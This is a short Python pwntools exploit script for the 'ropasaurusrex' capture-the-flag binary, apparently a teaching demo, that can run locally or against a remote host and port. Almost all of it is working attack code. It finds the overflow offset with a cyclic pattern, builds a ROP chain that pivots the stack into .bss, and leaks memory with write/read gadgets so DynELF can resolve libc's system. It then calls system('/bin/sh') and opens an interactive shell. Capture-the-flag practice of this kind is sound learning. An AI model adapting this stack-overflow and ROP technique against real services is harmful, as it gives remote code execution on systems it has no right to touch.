#!/usr/bin/env python
from pwn import *

binary = './ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d'

# Demo should work even without a HOST
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    r = process(binary)

# If we run with a cyclic pattern, we end up with the following state:
#
# $ cyclic 999 > input
# $ gdb ./ropasaurusrex
# $ run < input
# ...
# EBP: 0x6261616a (b'jaab')
# ESP: 0xffffc7e0 ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\310\377\377\030\226\004\b\030\202\004\b")
# EIP: 0x6261616b (b'kaab')
#
# Let's generate a bit of padding to get us up to the edge of EIP control.
padding = cyclic(cyclic_find('kaab'))

# Load the elf file
rex  = ELF(binary)

def myrop(base = None):
    with context.local(log_level = 'silent'):
        return ROP(rex, base = base)

# Our goal from here is to dynamically resolve the address for system
addrs = [rex.bss(0x200), rex.bss(0x300)]
cur_addr = addrs[0]

# Read in the first rop at cur_addr and migrate to it
rop = myrop()
rop.read(0, cur_addr, 0x100)
rop.migrate(cur_addr)
log.info("Stage 1 Rop:\n%s" % '\n'.join(rop.dump()))
r.send(padding + str(rop))

# Now we create a memleaker, so we can use DynELF
@MemLeak
def leak(addr, length = 0x100):
    global cur_addr

    rop = myrop(cur_addr)
    cur_addr = addrs[1] if cur_addr == addrs[0] else addrs[0]
    rop.write(1, addr, length)
    rop.read(0, cur_addr, 0x100)
    rop.migrate(cur_addr)
    r.send(str(rop))

    return r.recvn(length)

# Use the memleaker to resolve system from libc
resolver = DynELF.from_elf(leak, rex)
system = resolver.lookup('system')

# Call system('/bin/sh')
rop = myrop(cur_addr)
rop.call(system, ['/bin/sh'])

# Send the rop and win
r.send(str(rop))
r.interactive()
